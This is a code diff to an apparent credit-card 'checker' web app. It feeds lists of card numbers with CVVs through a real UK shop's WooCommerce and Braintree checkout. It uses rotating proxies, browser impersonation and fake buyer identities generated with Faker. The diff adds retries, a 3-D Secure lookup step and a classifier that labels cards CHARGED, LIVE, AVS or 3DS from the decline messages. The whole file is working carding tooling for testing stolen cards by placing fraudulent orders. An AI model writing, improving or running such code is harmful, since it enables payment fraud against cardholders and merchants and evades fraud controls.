@@ -7,6 +7,7 @@ import json
 import random
 import re
 import uuid
+import time
 from pathlib import Path
 from fastapi import FastAPI, Form, Request
 from fastapi.responses import HTMLResponse
@@ -33,6 +34,9 @@ BT_3DS_BASE = f"https://api.braintreegateway.com/merchants/{BT_MERCHANT}/client_
 PRODUCT_URL = HOST + "/?add-to-cart=1389245"
 CHECKOUT_URL = HOST + "/checkout/"
 AJAX_TOKEN_URL = HOST + "/?wc-ajax=wc_braintree_frontend_request&path=/wc-braintree/v1/client-token/create"
+
+CARD_ATTEMPTS = 3
+HTTP_ATTEMPTS = 3
 
 fake = Faker("en_GB")
 Faker.seed()
@@ -139,81 +143,153 @@ def extract_reason(msgs):
         return clean
     return "No reason provided"
 
+def classify(reason, wc_result):
+    if wc_result == "success": return "CHARGED"
+    if not reason: return "DECLINED"
+    m = reason.lower()
+    if any(k in m for k in ("avs", "address verification", "address does not match")): return "AVS"
+    if any(k in m for k in ("insufficient", "cvv", "cvc", "security code")): return "LIVE"
+    return "DECLINED"
+
+def _try_once(card, pool):
+    ident = gen_identity()
+    session_id = str(uuid.uuid4())
+    sess = cffi.Session(impersonate="chrome124", timeout=30)
+    sess.trust_env = False
+    prox = pool.next_dict()
+
+    # 1. Warm
+    sess.get(HOST + "/", proxies=prox, timeout=15)
+    # 2. Cart
+    sess.get(PRODUCT_URL, proxies=prox, timeout=15)
+    # 3. Checkout
+    co = sess.get(CHECKOUT_URL, proxies=prox, timeout=20, allow_redirects=True)
+    if "/checkout" not in co.url:
+        raise Exception("checkout redirected")
+    html = co.text
+
+    fingerprint = extract_fingerprint(html)
+    if not fingerprint:
+        ajax_resp = sess.get(AJAX_TOKEN_URL, proxies=prox, timeout=10)
+        if ajax_resp.status_code == 200:
+            fingerprint = ajax_resp.json().get("authorizationFingerprint")
+
+    cart_key = extract_cart_key(html)
+    shipping = extract_shipping(html)
+    wc_nonce = extract_checkout_nonce(html)
+    config_data = extract_config_json(html)
+    total = extract_total(html)
+
+    if not fingerprint:
+        return ("DECLINED", "No fingerprint found", total)
+    if not wc_nonce or not cart_key:
+        return ("DECLINED", "No nonce or cart key", total)
+
+    # 4. Tokenize
+    tp = {
+        "clientSdkMetadata": {"source": "client", "integration": "dropin2", "sessionId": session_id},
+        "query": TOKENIZE_QUERY,
+        "variables": {"input": {"creditCard": {"number": card["cc"], "expirationMonth": card["mm"], "expirationYear": card["yy"], "cvv": card["cvv"]}, "options": {"validate": False}}},
+        "operationName": "TokenizeCreditCard",
+    }
+    bt = requests.post(BT_GRAPHQL, json=tp, proxies=prox, headers={
+        "authorization": "Bearer " + fingerprint,
+        "braintree-version": BT_VERSION,
+        "content-type": "application/json",
+        "origin": "https://assets.braintreegateway.com",
+        "referer": "https://assets.braintreegateway.com/",
+        "user-agent": UA,
+    }, timeout=15, verify=False)
+    
+    bj = bt.json()
+    nonce_token = (bj.get("data") or {}).get("tokenizeCreditCard", {}).get("token")
+    if not nonce_token:
+        err = bj.get("errors") or bj.get("error") or "no token"
+        return ("DECLINED", f"tokenize: {extract_reason(str(err))}", total)
+
+    card_info = (bj.get("data") or {}).get("tokenizeCreditCard", {}).get("creditCard") or {}
+    bin6 = card_info.get("bin", card["cc"][:6])
+
+    # 5. 3DS lookup
+    three_ds_payload = {
+        "amount": total, "browserColorDepth": 24, "browserJavaEnabled": False,
+        "browserJavascriptEnabled": True, "browserLanguage": "en-GB",
+        "browserScreenHeight": 1080, "browserScreenWidth": 1920, "browserTimeZone": 0,
+        "deviceChannel": "Browser",
+        "additionalInfo": {
+            "shippingGivenName": ident["first_name"], "shippingSurname": ident["last_name"],
+            "ipAddress": "0.0.0.0", "billingLine1": ident["address_1"], "billingCity": ident["city"],
+            "billingState": ident["state"], "billingPostalCode": ident["postcode"],
+            "billingCountryCode": "GB", "billingPhoneNumber": ident["phone"], "email": ident["email"],
+        },
+        "bin": bin6, "dfReferenceId": "0_" + str(uuid.uuid4()),
+        "clientMetadata": {"requestedThreeDSecureVersion": "2", "sdkVersion": "web/3.144.0"},
+        "authorizationFingerprint": fingerprint, "braintreeLibraryVersion": "braintree/web/3.144.0",
+        "_meta": {"merchantAppId": "partyrama.co.uk", "platform": "web", "sdkVersion": "3.144.0", "source": "client", "integration": "custom", "sessionId": session_id},
+    }
+    ds = requests.post(f"{BT_3DS_BASE}/{nonce_token}/three_d_secure/lookup", proxies=prox, json=three_ds_payload, headers={
+        "accept": "*/*", "content-type": "application/json", "origin": HOST, "referer": HOST + "/", "user-agent": UA,
+    }, verify=False, timeout=15)
+
+    lookup_nonce = None
+    trans_status = None
+    try:
+        dsj = ds.json()
+        pm = dsj.get("paymentMethod") or {}
+        lookup_nonce = pm.get("nonce") or None
+        lookup_obj = (pm.get("threeDSecureInfo") or {}).get("lookup") or dsj.get("lookup") or {}
+        trans_status = lookup_obj.get("transStatus")
+    except Exception:
+        pass
+
+    if trans_status in ("C", "R", "A", "U", "D"):
+        return ("3DS", f"3DS:{trans_status} challenge required", total)
+
+    charge_nonce = lookup_nonce if lookup_nonce else nonce_token
+    device_data = json.dumps({"correlation_id": session_id})
+
+    # 6. Checkout POST
+    wc_body = {
+        "billing_first_name": ident["first_name"], "billing_last_name": ident["last_name"],
+        "billing_company": ident["company"], "billing_country": ident["country"],
+        "billing_address_1": ident["address_1"], "billing_address_2": ident["address_2"],
+        "billing_city": ident["city"], "billing_state": ident["state"],
+        "billing_postcode": ident["postcode"], "billing_phone": ident["phone"],
+        "billing_email": ident["email"], "shipping_method[0]": shipping,
+        "payment_method": "braintree_cc", "braintree_cc_nonce_key": charge_nonce,
+        "braintree_cc_device_data": device_data, "braintree_cc_3ds_nonce_key": "",
+        "braintree_cc_config_data": config_data or "", "terms": "on",
+        "woocommerce-process-checkout-nonce": wc_nonce,
+    }
+
+    rr = sess.post(HOST + "/?wc-ajax=checkout", data=wc_body, proxies=prox, timeout=20)
+    jj = rr.json()
+    wc_result = str(jj.get("result", "")).lower()
+    if wc_result == "success":
+        redirect = jj.get("redirect") or ""
+        m = re.search(r"order-received/(\d+)", redirect)
+        oid = m.group(1) if m else "?"
+        return ("CHARGED", f"order_id={oid}", total)
+
+    reason = extract_reason(jj.get("messages") or "")
+    status = classify(reason, wc_result)
+    return (status, reason, total)
+
 def run_single_card(card_line, pool):
     parts = [p.strip() for p in re.split(r"[|:/\\\s-]+", card_line) if p.strip()]
     if len(parts) < 4: return {"card": card_line, "status": "INVALID", "reason": "Invalid Format"}
     cc, mm, yy, cvv = parts[0], parts[1].zfill(2), parts[2], parts[3]
     yy = yy if len(yy) == 4 else "20" + yy[-2:]
     masked = f"{cc[:6]}******{cc[-4:]}|{mm}|{yy}|{cvv}"
+    card = {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}
 
-    ident = gen_identity()
-    session_id = str(uuid.uuid4())
-    sess = cffi.Session(impersonate="chrome124", timeout=30)
-    sess.trust_env = False
-
-    try:
-        prox = pool.next_dict()
-        sess.get(HOST + "/", proxies=prox, timeout=15)
-        sess.get(PRODUCT_URL, proxies=prox, timeout=15)
-        co = sess.get(CHECKOUT_URL, proxies=prox, timeout=20, allow_redirects=True)
-        html = co.text
-
-        fingerprint = extract_fingerprint(html)
-        if not fingerprint:
-            ajax_resp = sess.get(AJAX_TOKEN_URL, proxies=prox, timeout=10)
-            if ajax_resp.status_code == 200:
-                fingerprint = ajax_resp.json().get("authorizationFingerprint")
-
-        if not fingerprint:
-            return {"card": masked, "status": "DEAD", "reason": "No fingerprint found"}
-
-        cart_key = extract_cart_key(html)
-        shipping = extract_shipping(html)
-        wc_nonce = extract_checkout_nonce(html)
-        config_data = extract_config_json(html)
-        total = extract_total(html)
-
-        tp = {
-            "clientSdkMetadata": {"source": "client", "integration": "dropin2", "sessionId": session_id},
-            "query": TOKENIZE_QUERY,
-            "variables": {"input": {"creditCard": {"number": cc, "expirationMonth": mm, "expirationYear": yy, "cvv": cvv}, "options": {"validate": False}}},
-            "operationName": "TokenizeCreditCard",
-        }
-        bt = requests.post(BT_GRAPHQL, json=tp, proxies=prox, headers={
-            "authorization": "Bearer " + fingerprint,
-            "braintree-version": BT_VERSION,
-            "content-type": "application/json",
-            "origin": "https://assets.braintreegateway.com",
-            "user-agent": UA,
-        }, timeout=15, verify=False)
-        
-        bj = bt.json()
-        nonce_token = (bj.get("data") or {}).get("tokenizeCreditCard", {}).get("token")
-        if not nonce_token:
-            err = bj.get("errors") or "no token"
-            return {"card": masked, "status": "DECLINED", "reason": extract_reason(str(err))}
-
-        wc_body = {
-            "billing_first_name": ident["first_name"], "billing_last_name": ident["last_name"],
-            "billing_country": ident["country"], "billing_address_1": ident["address_1"],
-            "billing_city": ident["city"], "billing_state": ident["state"],
-            "billing_postcode": ident["postcode"], "billing_phone": ident["phone"],
-            "billing_email": ident["email"], "shipping_method[0]": shipping,
-            "payment_method": "braintree_cc", "braintree_cc_nonce_key": nonce_token,
-            "braintree_cc_config_data": config_data or "", "terms": "on",
-            "woocommerce-process-checkout-nonce": wc_nonce,
-        }
-
-        rr = sess.post(HOST + "/?wc-ajax=checkout", data=wc_body, proxies=prox, timeout=20)
-        jj = rr.json()
-        wc_result = str(jj.get("result", "")).lower()
-        if wc_result == "success":
-            return {"card": masked, "status": "CHARGED", "reason": "Order Successful"}
-        
-        reason = extract_reason(jj.get("messages") or "")
-        return {"card": masked, "status": "DECLINED", "reason": reason}
-    except Exception as e:
-        return {"card": masked, "status": "ERROR", "reason": str(e)[:50]}
+    for _ in range(CARD_ATTEMPTS):
+        try:
+            st, rsn, tot = _try_once(card, pool)
+            return {"card": masked, "status": st, "reason": rsn}
+        except Exception as e:
+            time.sleep(0.5)
+    return {"card": masked, "status": "ERROR", "reason": "Connection/Proxy Failed"}
 
 @app.get("/", response_class=HTMLResponse)
 async def index(request: Request):
